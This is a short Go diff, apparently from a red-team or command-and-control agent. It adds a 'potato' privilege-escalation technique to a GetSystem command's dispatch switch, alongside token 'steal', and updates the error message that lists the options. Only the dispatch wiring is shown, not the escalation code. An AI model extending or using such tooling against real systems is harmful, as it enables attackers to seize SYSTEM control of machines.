@@ -51,9 +51,11 @@ func (c *GetSystemCommand) Execute(task structs.Task) structs.CommandResult {
 	switch strings.ToLower(args.Technique) {
 	case "steal":
 		return getSystemViaSteal(oldIdentity)
+	case "potato":
+		return getSystemViaPotato(oldIdentity)
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown technique: %s. Available: steal", args.Technique),
+			Output:    fmt.Sprintf("Unknown technique: %s. Available: steal, potato", args.Technique),
 			Status:    "error",
 			Completed: true,
 		}
